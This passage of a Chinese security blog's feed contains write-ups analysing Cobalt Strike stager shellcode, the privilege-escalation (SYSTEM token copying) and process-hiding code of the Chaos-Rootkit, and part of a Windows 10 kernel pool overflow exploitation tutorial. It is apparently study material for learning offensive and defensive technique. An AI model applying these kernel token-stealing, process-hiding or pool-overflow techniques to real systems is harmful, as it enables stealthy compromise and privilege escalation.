/></p><p>比shellcode好多了的是这种payload会使用exe提供的<code>GetModuleHandleA</code>和<code>GetProcAddress</code>，从而避免了从LDR中遍历得到</p><h1 id="stager-shellcode-payload分析"><a class="markdownIt-Anchor" href="#stager-shellcode-payload分析"></a> Stager Shellcode Payload分析</h1><p>将刚才还原的<code>decrypted_shellcode.bin</code>放到ida中分析汇编（64位）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528095217268.png" alt="image-20250528095217268" /></p><p>最开始IDA会将这段识别为数据，可以直接右键</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528095308675.png" alt="image-20250528095308675" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528095323950.png" alt="image-20250528095323950" /></p><p>可以创建为一个函数，便于分析</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528095146672.png" alt="image-20250528095146672" /></p><p>汇编逐行分析的话确实有点冗长</p><p>第一阶段：找到相关函数并加载</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528100242402.png" alt="image-20250528100242402" /></p><p>这里使用循环Ldr和异或比较得到关键值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528100709289.png" alt="image-20250528100709289" /></p><p>一般来说对应的C代码长这样</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528100759128.png" alt="image-20250528100759128" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101218855.png" alt="image-20250528101218855" /></p><ul><li><p>找到loadlib</p></li><li><p>加载wininet加载相关函数，如果想知道传入的参数，直接按照传参顺序看寄存器即可（一般是stdcall）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101605152.png" alt="image-20250528101605152" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101746701.png" alt="image-20250528101746701" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101801289.png" alt="image-20250528101801289" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101812830.png" alt="image-20250528101812830" /></p><p>估计从这里开始准备接收第二阶段payload然后运行</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528101926813.png" alt="image-20250528101926813" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250528102238222.png" alt="image-20250528102238222" /></p><p>这里每次读取0x2000大小知道读完，传输了一段shellcode</p></li></ul><p>第二阶段：反射式加载payload，这里运行的shellcode就是teamserveer分发过来的了，提取这部分的shellcode</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;cobaltstrike的payload主要分为Stager和Stageless&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Stager：分阶段式上线，从teamserver下载真正的payload后执行，体积小&lt;/li&gt;
&lt;li&gt;Stageless：部分阶段上线，真正的payload直接在其中，适合用于红队测试中的免杀制作，体积大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ&quot;&gt;https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【RootKit】Chaos-Rootkit解读-2 权限提升</title>
    <link href="https://joe1sn.eu.org/2025/05/08/rookit-2-priv-escalation/"/>
    <id>https://joe1sn.eu.org/2025/05/08/rookit-2-priv-escalation/</id>
    <published>2025-05-08T00:16:35.000Z</published>
    <updated>2025-05-08T00:58:53.373Z</updated>
    
    <content type="html"><![CDATA[<p>去年学了点kernel开发，实战太少了，看看别人的代码怎么写的</p><p>项目地址：<a href="https://github.com/ZeroMemoryEx/Chaos-Rootkit">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></p><span id="more"></span><h1 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h1><p>测试环境：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430073259244.png" alt="image-20250430073259244" /></p><p>连接到rookit</p><h2 id="原理剖析"><a class="markdownIt-Anchor" href="#原理剖析"></a> 原理剖析</h2><p>其实可以手动实现这个过程</p><p>首先打开一个cmd.exe</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508082307283.png" alt="image-20250508082307283" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508082819833.png" alt="image-20250508082819833" /></p><p>结构体中表示权限的是一个叫<code>+0x4b8 Token            : _EX_FAST_REF</code>的东西</p><p>Token是一个<code>_EX_FAST_REF</code>类型的Union值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508082952552.png" alt="image-20250508082952552" /></p><p><code>RefCnt</code>记录了Token引用的数目，是数据的低4位(64位中，32位是3位)</p><p>将当前进程的除<code>RefCnt</code>以外的其他bit位设置为和<strong>System</strong>的一致就行了</p><p>这里 <code>Value</code>与掩码<code>-0xd</code>（RefCount）进行<code>&amp;</code>运算就能得到真实的Token值</p><p>现在将计算出的Token值复制给cmd.exe（<strong>这是一个新的Token</strong>）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508083737538.png" alt="image-20250508083737538" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508083822234.png" alt="image-20250508083822234" /></p><h2 id="更进一步"><a class="markdownIt-Anchor" href="#更进一步"></a> 更进一步</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508084058521.png" alt="image-20250508084058521" /></p><p>另外一种就是经典的 **_sep_token Privileges Abusing **</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508084310751.png" alt="image-20250508084310751" /></p><p>在<code>+0x40</code>的位置是一个<code>_sep_token_privileges</code>结构体</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508084436050.png" alt="image-20250508084436050" /></p><p><code>Present</code>：包含令牌的当前特权</p><p><code>Enabled</code>：包含令牌上所有已启用的特权</p><p><code>EnabledByDefault</code> 表示令牌在构造时的默认状态</p><p>尝试将<code>enable</code>值变为<code>present</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508084929888.png" alt="image-20250508084929888" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508084952418.png" alt="image-20250508084952418" /></p><p><strong>如果方法一中有部分权限未启用，可以使用这种方法开启所有特权</strong></p><h2 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析"></a> 代码分析</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">PrivilegeElevationForProcess</span><span class="params">(<span class="type">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID process = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID systemProcess = <span class="literal">NULL</span>;</span><br><span class="line">    PACCESS_TOKEN targetToken = <span class="literal">NULL</span>;</span><br><span class="line">    PACCESS_TOKEN systemToken = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Lookup the target process by PID</span></span><br><span class="line">        NTSTATUS status = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)pid, &amp;process);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        status = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)<span class="number">0x4</span>, &amp;systemProcess);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="type">char</span>* imageName = <span class="built_in">PsGetProcessImageFileName</span>((PEPROCESS)process);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Target process image name: %s\n&quot;</span>, imageName);</span><br><span class="line">        targetToken = <span class="built_in">PsReferencePrimaryToken</span>(process);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;%s token: %x\n&quot;</span>, imageName, targetToken);</span><br><span class="line">        systemToken = <span class="built_in">PsReferencePrimaryToken</span>(systemProcess);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;System token: %x\n&quot;</span>, systemToken);</span><br><span class="line">        ULONG_PTR targetTokenAddress = (ULONG_PTR)process + eoffsets.Token_offset;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;%s token address: %x\n&quot;</span>, imageName, targetTokenAddress);</span><br><span class="line">        ULONG_PTR systemTokenAddress = (ULONG_PTR)systemProcess + eoffsets.Token_offset;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;System token address: %x\n&quot;</span>, systemTokenAddress);</span><br><span class="line">        *(PHANDLE)targetTokenAddress = *(PHANDLE)systemTokenAddress;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process %s token updated to: %x\n&quot;</span>, imageName, *(PHANDLE)(targetTokenAddress));</span><br><span class="line">    &#125;</span><br><span class="line">    __finally</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最关键的就是<code>*(PHANDLE)targetTokenAddress = *(PHANDLE)systemTokenAddress;</code></p><p><strong>效果</strong></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250508085620515.png" alt="image-20250508085620515" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;去年学了点kernel开发，实战太少了，看看别人的代码怎么写的&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ZeroMemoryEx/Chaos-Rootkit&quot;&gt;https://github.com/ZeroMemoryEx/Chaos-Rootkit&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="note" scheme="https://joe1sn.eu.org/tags/note/"/>
    
    <category term="rootkit" scheme="https://joe1sn.eu.org/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>【RootKit】Chaos-Rootkit解读-1 进程隐藏</title>
    <link href="https://joe1sn.eu.org/2025/04/30/rookit-1-hide-process/"/>
    <id>https://joe1sn.eu.org/2025/04/30/rookit-1-hide-process/</id>
    <published>2025-04-29T23:29:17.000Z</published>
    <updated>2025-04-30T01:03:48.245Z</updated>
    
    <content type="html"><![CDATA[<p>去年学了点kernel开发，实战太少了，看看别人的代码怎么写的</p><p>项目地址：<a href="https://github.com/ZeroMemoryEx/Chaos-Rootkit">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></p><span id="more"></span><h1 id="进程隐藏"><a class="markdownIt-Anchor" href="#进程隐藏"></a> 进程隐藏</h1><p>测试环境：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430073259244.png" alt="image-20250430073259244" /></p><p>连接到rookit</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430074025149.png" alt="image-20250430074025149" /></p><p>使用效果：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430074124118.png" alt="image-20250430074124118" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430074144155.png" alt="image-20250430074144155" /></p><h2 id="原理剖析"><a class="markdownIt-Anchor" href="#原理剖析"></a> 原理剖析</h2><p>在<code>Driver.c/processIoctlRequest</code>中处理这个功能的ioctl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">processIoctlRequest</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    DEVICE_OBJECT* DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IRP* Irp</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIO_STACK_LOCATION  pstack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pstatus = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> inputInt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if system offsets not supported / disable features </span></span><br><span class="line">        <span class="comment">// that require the use of offsets to avoid crash</span></span><br><span class="line">        <span class="keyword">if</span> (pstack-&gt;Parameters.DeviceIoControl.IoControlCode &gt;= HIDE_PROC &amp;&amp; \</span><br><span class="line">            pstack-&gt;Parameters.DeviceIoControl.IoControlCode &lt;= UNPROTECT_ALL_PROCESSES &amp;&amp; xHooklist.check_off)</span><br><span class="line">        &#123;</span><br><span class="line">            pstatus = ERROR_UNSUPPORTED_OFFSET;</span><br><span class="line">            __leave;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (pstack-&gt;Parameters.DeviceIoControl.IoControlCode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> HIDE_PROC:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pstack-&gt;Parameters.DeviceIoControl.InputBufferLength &lt; <span class="built_in">sizeof</span>(<span class="type">int</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                pstatus = STATUS_BUFFER_TOO_SMALL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">RtlCopyMemory</span>(&amp;inputInt, Irp-&gt;AssociatedIrp.SystemBuffer, <span class="built_in">sizeof</span>(inputInt));</span><br><span class="line"></span><br><span class="line">            pstatus = <span class="built_in">HideProcess</span>(inputInt);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;Received input value: %d\n&quot;</span>, inputInt);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心功能函数<code>HideProcess</code></p><p>首先通过<code>PsLookupProcessByProcessId</code>找到EPROCESS</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430074718524.png" alt="image-20250430074718524" /></p><p>然后就是找到<code>activelist</code>双向链表，然后将当前eprocess从双向链表中摘除</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430074828264.png" alt="image-20250430074828264" /></p><p>关于<code>eprocess</code>的双向链表<code>activelist</code>你可以回顾前文：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/">【Win Pwn】HEVD-内核栈溢出(下)</a></p><p>这里简单提及：</p><blockquote><p>在刚才的<code>EPROCESS</code>中，有一段记录的是程序的链表：<code>ActiveProcessLinks</code>，而且windows会生成一段独特的标识来标记每一个程序：<code>UniqueProcessId</code>，在这段 <strong>双向</strong> 链表上每段程序都可以被找到，因为可以向前和向后查找。</p></blockquote><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><p>这里我新建了一个<code>cmd.exe</code>，进程pid为：<code>4648(0x1228)</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430080321276.png" alt="image-20250430080321276" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430080433357.png" alt="image-20250430080433357" /></p><p>此时他的flink和blink为</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430080607648.png" alt="image-20250430080607648" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430081947836.png" alt="image-20250430081947836" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/hide_process.png" alt="hide_process" /></p><p>之后使用rootkit</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430082442539.png" alt="image-20250430082442539" /></p><h2 id="开发"><a class="markdownIt-Anchor" href="#开发"></a> 开发</h2><p>双向链表删除作为数据结构基础部分没啥好说的，<strong>值得一提的是这里的锁设计</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function"><span class="title">HideProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> pid</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    BOOLEAN lockAcquired = FALSE;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">            <span class="built_in">ExAcquirePushLockExclusive</span>(&amp;pLock);</span><br><span class="line">            lockAcquired = TRUE;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    __finally</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span> (lockAcquired)</span><br><span class="line">            <span class="built_in">ExReleasePushLockExclusive</span>(&amp;pLock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在os运行时，内核可能会对这块链表进行修改，当我们修改时在这里添加一个锁可以有效地避免条件竞争导致出现的未定义行为</p><h2 id="防护"><a class="markdownIt-Anchor" href="#防护"></a> 防护</h2><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250430083050562.png" alt="image-20250430083050562" /></p><p>其实可以这样想，在任务管理器中我们已经看不到了这个进程，那么为什么在windbg中依然能够通过PID找到该进程呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;去年学了点kernel开发，实战太少了，看看别人的代码怎么写的&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ZeroMemoryEx/Chaos-Rootkit&quot;&gt;https://github.com/ZeroMemoryEx/Chaos-Rootkit&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="note" scheme="https://joe1sn.eu.org/tags/note/"/>
    
    <category term="rootkit" scheme="https://joe1sn.eu.org/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】Windows10 内核池溢出</title>
    <link href="https://joe1sn.eu.org/2025/04/16/win-exp-big-non-paged-pool-overflow/"/>
    <id>https://joe1sn.eu.org/2025/04/16/win-exp-big-non-paged-pool-overflow/</id>
    <published>2025-04-16T01:04:54.000Z</published>
    <updated>2025-04-17T00:21:49.635Z</updated>
    
    <content type="html"><![CDATA[<p>内核也太难了，主要讲述大NonPagedPool的溢出利用</p><p>公众号：<a href="https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg">https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="复现windows10-内核池溢出"><a class="markdownIt-Anchor" href="#复现windows10-内核池溢出"></a> 【复现】Windows10 内核池溢出</h1><p>前置知识：</p><ol><li>windows内核调试</li><li>windows内核提权基础</li><li>简单的windows驱动编写（hello world级别）</li><li>linux pwn堆溢出利用方式</li><li>一点点数据结构的知识（双向链表）</li></ol><p>文章讲述并复现在Windows高版本内核中NonPagedPoolNx溢出的利用方法</p><h1 id="目录"><a class="markdownIt-Anchor" href="#目录"></a> 目录</h1><p>[toc]</p><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><p>​很多资料都是直接翻译外文文献，翻译质量差，没有直接的实操，并且随着windows的更新，比较缺乏现代windows 10\11的、比较易学的攻击方式。这里使用：<a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a>[1]作为基础的讲解，原文中的图示个人感觉还是讲的不够透彻,这里个人借着原文重新讲述下。</p><h2 id="命名管道介绍"><a class="markdownIt-Anchor" href="#命名管道介绍"></a> 命名管道介绍</h2><p>​这是windows提供的用于进程间通讯的一种机制。首先是**服务端(server)**创建命名管道，**客户端(client)**使用<code>CreateFile</code>连接到服务端。双方可以使用<code>ReadFile</code>和<code>WriteFile</code>进行读、写的通讯。这种利用方式非常常见，比如说在<code>cobaltstrike</code>的木马中就是用到了这种通讯，具体例子可以参考公众号的文章： <a href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">【免杀】使用CobaltStrike的外置监听器绕过检测</a>[2]。</p><p>​当管道成功建立后，底层驱动程序(<code>npfs.sys</code>)会在上下文控制块 (CCB) 中创建两个队列，每个队列对应一个CCB队列。当有消息写入时，比如**服务端想客户端发送消息(<code>WriteFile</code>)**时，会在队列中创建如下结构体，<strong>后文简称为dqe</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DATA_QUEUE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY NextEntry;</span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">uint32_t</span> EntryType;</span><br><span class="line">    <span class="type">uint32_t</span> QuotaInEntry;</span><br><span class="line">    <span class="type">uint32_t</span> DataSize;</span><br><span class="line">    <span class="type">uint32_t</span> x;</span><br><span class="line">    <span class="type">char</span> Data[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当**客户端开始接收消息(<code>ReadFile</code>)**时，就会从队列中释放掉该消息</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/DATA_QUEUE_ENTRY.drawio.png" alt="DATA_QUEUE_ENTRY.drawio" style="zoom: 33%;" /><ul><li><p><strong>NextEntry</strong>: Windows中的经典 <strong>双向循环链表</strong>，<code>LIST_ENTRY</code>中<code>flink</code>指向下一个<code>entry</code>，<code>blink</code>指向上一个。当结构体被释放时(如执行<code>ReadFile</code>)，会进行相邻结构体链表之间的重新连接，也就是数据结构中双向链表中的删除操作。注意的是，在windows 10中新增了校验操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry-&gt;Flink-&gt;Blink!=entry</span><br></pre></td></tr></table></figure><p>这样可以避免溢出时覆盖<code>entry-&gt;flink</code>的<code>blink</code>，造成的劫持</p></li><li><p><strong>SecurityContext</strong>: 安全上下文，主要是模仿客户端的行为，比如客户端访问权限等，在这里并不重要。</p></li><li><p><strong>EntryType</strong>: <code>DATA_QUEUE_ENTRY</code>的类型，一般分为两种：<code>buffered</code>和<code>unbuffered</code></p><ul><li><p><code>buffered</code>: <code>EntryType=0</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小足够存放<code>UserData</code></strong>，读取时直接从<code>UserData</code>处复制</p></li><li><p><code>unbuffered</code>: <code>EntryType=1</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小只存放<code>DATA_QUEUE_ENTRY</code></strong>，读取时要调用<code>IRP</code>来实现读取。可以使用如下函数来创建这种<code>Entry</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtFsControlFile(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Irp</strong>: 处理的中断请求</p></li><li><p><strong>QuotaInEntry</strong>: 空间剩余配额，对于<code>buffered</code>来说，每次读取可能不会全部读完，<code>QuotaInEntry</code>记录了剩余<code>UserData</code>读取的大小，即<code>QuotaInEntry</code>初始值等于<code>DataSize</code>，每次读取都会减去已经读取的长度，直到<code>QuotaInEntry=0</code>；对于<code>unbuffered</code>来说值恒为<code>0</code>。</p></li><li><p><strong>DataSize</strong>: 很重要，它描述了<code>UserData</code>的大小。</p></li></ul><p>当服务端想客户端发送消息时，<code>npfs</code>会申请<code>0x30+DataSize</code>大小(并会对齐)的内核池，其中<code>0x30</code>是为了存放<code>DATA_QUEUE_ENTRY</code>头部</p><h2 id="配额管理机制"><a class="markdownIt-Anchor" href="#配额管理机制"></a> 配额管理机制</h2><p>配额管理机制(QuotaInEntry)：允许通信通道的服务器端指定队列可容纳的<strong>最大数据大小</strong>。<strong>超过该限制时</strong>：</p><ul><li>在阻塞模式 (PIPE_WAIT) 下，创建条目时将 QuotaInEntry 设置为当前队列中可用的字节数。之后，每次对缓冲条目执行读取（read而非peek）操作后，读取大小都会添加到已停止写入的 QuotaInEntry 中。当 QuotaInEntry 等于 DataSize 时，表示管道配额中有足够的空间容纳该条目，并且其关联的 IRP 已完成，qde从当前数据条目中移除。</li><li>在非阻塞模式 (PIPE_NOWAIT) 下，操作将失败。（写入的字节数将等于 0）</li></ul><h2 id="漏洞代码"><a class="markdownIt-Anchor" href="#漏洞代码"></a> 漏洞代码</h2><p>这里使用：</p><p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/5315ee63753b0747d5a6010e2486dfbe45b8e123/vulnerable_driver/Overfl0w.cpp#L68">https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/5315ee63753b0747d5a6010e2486dfbe45b8e123/vulnerable_driver/Overfl0w.cpp#L68</a></p><p>这段代码的64位编译进行讲解，同时我增加了一段打印来方便调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 